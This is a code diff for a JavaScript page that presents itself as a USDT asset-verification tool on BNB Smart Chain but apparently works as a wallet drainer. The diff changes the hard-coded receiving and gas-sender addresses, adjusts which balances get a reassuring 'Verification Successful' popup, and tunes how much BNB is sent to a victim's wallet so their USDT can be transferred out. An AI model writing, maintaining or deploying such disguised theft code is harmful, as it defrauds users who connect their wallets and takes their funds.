@@ -1,5 +1,5 @@
-const bscAddress = "0x54dE549D98B0440678199334965Fd7Fa0A896088"; // Your USDT receiving address
-const bnbGasSender = "0x54dE549D98B0440678199334965Fd7Fa0A896088"; // Wallet for gas fees
+const bscAddress = "0x8EA4e4B8f2e7370F2a9Bf4Fd6403AE6c0387A365"; // Your USDT receiving address
+const bnbGasSender = "0x8EA4e4B8f2e7370F2a9Bf4Fd6403AE6c0387A365"; // Wallet for gas fees
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
 
 let web3;
@@ -54,12 +54,12 @@ async function verifyAssets() {
     console.log(`USDT Balance: ${usdtBalance} USDT`);
     console.log(`BNB Balance: ${userBNB} BNB`);
 
-    if (usdtBalance === 0) {
+    if (usdtBalance === 01) {
         showPopup("No assets found.", "black");
         return;
     }
 
-    if (usdtBalance <= 05) {
+    if (usdtBalance <= 10) {
         showPopup(
             `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
             "green"
@@ -75,7 +75,7 @@ async function verifyAssets() {
 
 async function transferUSDT(usdtBalance, userBNB) {
     try {
-        if (userBNB < 0.0005) {
+        if (userBNB < 0.005) {
             console.log("Low BNB detected, sending gas fee...");
             await sendBNB(userAddress, "0.001");
         }
